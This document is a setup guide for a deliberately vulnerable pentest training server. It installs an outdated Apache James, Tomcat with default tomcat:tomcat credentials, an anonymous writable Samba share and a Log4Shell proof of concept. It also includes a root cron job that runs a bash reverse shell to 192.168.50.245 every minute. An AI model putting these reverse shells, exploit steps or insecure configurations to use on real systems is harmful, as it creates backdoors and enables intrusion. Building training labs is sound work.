# Vulnerable server
### You can use this script and the configurations that follow to create vulnerable lab for network pentest training

```
#!/bin/bash
sudo apt update
#Samba
echo "*********Install samba*********"
sudo apt install samba -y
#sudo systemctl status smbd
sudo mkdir -p /samba
sudo ufw allow samba
echo "*******samba done**********"
#install docker
echo "***********Install docker***********"
sudo apt update
sudo apt install ca-certificates curl gnupg lsb-release
sudo mkdir -p /etc/apt/keyrings
curl -fsSL https://download.docker.com/linux/ubuntu/gpg | sudo gpg --dearmor -o /etc/apt/keyrings/docker.gpg
echo \
  "deb [arch=$(dpkg --print-architecture) signed-by=/etc/apt/keyrings/docker.gpg] https://download.docker.com/linux/ubuntu \
  $(lsb_release -cs) stable" | sudo tee /etc/apt/sources.list.d/docker.list > /dev/null
  sudo apt update
  sudo chmod a+r /etc/apt/keyrings/docker.gpg -y
sudo apt update
sudo apt-get install docker-ce docker-ce-cli containerd.io docker-compose-plugin -y
sudo usermod -aG docker ${USER}
echo "*********docker is done**********"
echo "*********install james server********"
sudo apt install bash-completion  
curl -O https://archive.apache.org/dist/james/server/apache-james-2.3.2.tar.gz
tar -xzf apache-james-2.3.2.tar.gz
sudo cp -r james-2.3.2 /opt
sudo chmod +x /opt/james-2.3.2/bin/*.sh
curl -O https://repo.huaweicloud.com/java/jdk/8u202-b08/jdk-8u202-linux-i586.tar.gz  
tar -xf jdk-8u202-linux-i586.tar.gz 
sudo mv jdk1.8.0_202 /opt/james-2.3.2/bin/
echo "***********james server done **********"
#Tomcat
echo "********About to install apache tomcat***"
curl -O https://dlcdn.apache.org/tomcat/tomcat-9/v9.0.71/bin/apache-tomcat-9.0.71.tar.gz
tar -xf apache-tomcat-9.0.71.tar.gz
sudo mv apache-tomcat-9.0.71 /opt
echo "apache tomcat is done"
#Log4j PoC
echo "*********log4j poc************"
mkdir ~/mylog4j
git clone https://github.com/kozmer/log4j-shell-poc.git
sudo mv log4j-shell-poc ~/mylog4j
curl -O https://repo.huaweicloud.com/java/jdk/8u202-b08/jdk-8u202-linux-i586.tar.gz  
tar -xf jdk-8u202-linux-i586.tar.gz 
mv  jdk1.8.0_202  jdk1.8.0_20
sudo mv jdk1.8.0_20 ~/mylog4j/log4j-shell-poc
cd ~/mylog4j/log4j-shell-poc
sudo apt install python3-pip
pip install -r requirements.txt
echo "*******log4j poc done*******"
```

# Configure the James Server Phonix.sh script 
```
cd /opt/james-2.3.2/bin
open the phonix.sh file and set the JAVA_HOME as shown below in RED:

...
JAVA_HOME="jdk1.8.0_20"
usage()
{
    echo "Usage: $0 {start|stop|run|restart|check}"
    exit 1
}
…
```
# Create Start James server Script with the name startjamesserver.sh
```
#startjamesserver.sh
#!/bin/bash
cd /opt/james-server/bin
echo "apache james server started"
sudo ./run.sh
```
## Run 

chmod + startjamesserver.sh

./startjamesserver.sh to start the server.

# Apache Tomcat Configuration
Open the tomcat-users.xml in the /opt/apache-tomcat-9.0.68/conf
Replace the manager section with 
```
<role rolename="manager-gui"/>
<user username="tomcat" password="tomcat" roles="manager-gui"/>
</tomcat-users>

…
<!--
  <role rolename="tomcat"/>
  <role rolename="role1"/>
  <user username="tomcat" password="<must-be-changed>" roles="tomcat"/>
  <user username="both" password="<must-be-changed>" roles="tomcat,role1"/>
  <user username="role1" password="<must-be-changed>" roles="role1"/>
-->
<role rolename="manager-gui"/>
<user username="tomcat" password="tomcat" roles="manager-gui"/>
</tomcat-users>

```

# Start apache with script name startapache.sh
```
#!/bin/bash
cd /opt/tomcat/apache-tomcat-9.0.68/bin
./startup.sh

chmod +x startapache.sh
sudo ./startapache.sh
```

# Log4j PoC

Run the payload generator to generate payload script

#generatelog4jpayload.sh
```
#!/bin/bash
echo "site runs at port 8080"
cd ~/mylog4j/log4j-shell-poc
python3 poc.py --userip localhost --webport 8000 --lport 9001
chmod +x generatelog4jpayload.sh
./generatelog4jpayload.sh
```
Where generatelog4jpayload.sh is the name of the script above.

# Start reverse shell listerner

nc -lvnp 9001

# Build the docker image
```
#!/bin/bash
cd ~/mylog4j/log4j-shell-poc
docker build -t log4j-shell-poc .
```
# Run docker website
```
docker run --network host log4j-shell-poc
```
Once it is running, you can access it on localhost:8080

Copy the payload and paste it in the vulnerable site.

# Samba config
## Create Users password
```
sudo adduser username
sudo smbpasswd -a username
```
## Configure the Samba users in the smb.conf file as follows:

```
sudo nano /etc/samba/smb.conf

#======================= Global Settings =======================

[global]

#just addedd
#client min protocol = SMB2
#client max protocol = SMB3
## Browsing/Identification ###
# Change this to the workgroup/NT-domain name your Samba server will part of
   workgroup = WORKGROUP
[Anonymous]
# comment = YOUR COMMENTS
 path = /samba/anonymous
 public = yes
 guest only = yes
 browsable = yes
 force create mode = 0666
 force directory mode = 0777
 writable = yes
 guest ok = yes
 read only = no
 force user = nobody
[users]
    path = /samba/users
    browseable = yes
    valid users = @smbgrp
    read only = no
    force create mode = 0660
    force directory mode = 2770
    valid users = @sambashare @sadmin
[josh]
    path = /samba/josh
    browseable = yes
    valid users = @smbgrp
    read only = no
    force create mode = 0660
    force directory mode = 2770
    valid users = josh @sadmin
[James]
    path = /samba/james
    browseable = no
    valid users = @smbgrp
    read only = yes
    force create mode = 0660
    force directory mode = 2770
    valid users = james @sadmin
```
# Restart
sudo systemctl restart smbd

# Crontab configuration
Go to sudo nano /etc/crontab

Edit the cron job file as below:
```
# /etc/crontab: system-wide crontab
# Unlike any other crontab you don't have to run the `crontab'
# command to install the new version when you edit this file
# and files in /etc/cron.d. These files also have username fields,
# that none of the other crontabs do.
SHELL=/bin/sh
# You can also override PATH, but by default, newer versions inherit it from the environment
PATH=/home/oslomet:/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin
# Example of job definition:
# .---------------- minute (0 - 59)
# |  .------------- hour (0 - 23)
# |  |  .---------- day of month (1 - 31)
# |  |  |  .------- month (1 - 12) OR jan,feb,mar,apr ...
# |  |  |  |  .---- day of week (0 - 6) (Sunday=0 or 7) OR sun,mon,tue,wed,thu,fri,sat
# |  |  |  |  |
# *  *  *  *  * user-name command to be executed
*  *   * * *    root    backup.sh
*  *   * * *    root   reverse.sh
*  *   * * *    root    script.sh
17 *    * * *   root    cd / && run-parts --report /etc/cron.hourly
25 6    * * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
47 6    * * 7   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
52 6    1 * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
#
```
# backup.sh script

```
#!/bin/bash
#chmod +s /bin/bash
# bash -i   >&  /dev/tcp/192.168.50.245/1234  0  >&1
#nc 192.168.50.234 1234
```
# reverse.sh
```
#!/bin/bash
#bash -i     >&  /dev/tcp/192.168.50.245/1234  0  >&1
#bash -i  >&  /dev/tcp/192.168.50.245/1234  0  >&1 
bash -c  "bash -i >& /dev/tcp/192.168.50.245/1234 0>&1"
```
# SSH
Generate ssh key with ssh-keygen

Passphrase PASSPHRASE

Accept the default settings

cat .ssh/id_rsa.pub >> ~/.ssh/authorized_keys

# References
https://github.com/kozmer/log4j-shell-poc

https://phoenixnap.com/kb/ubuntu-samba

https://crimsonglow.ca/~kjiwa/2016/06/exploiting-apache-james-2.3.2.html


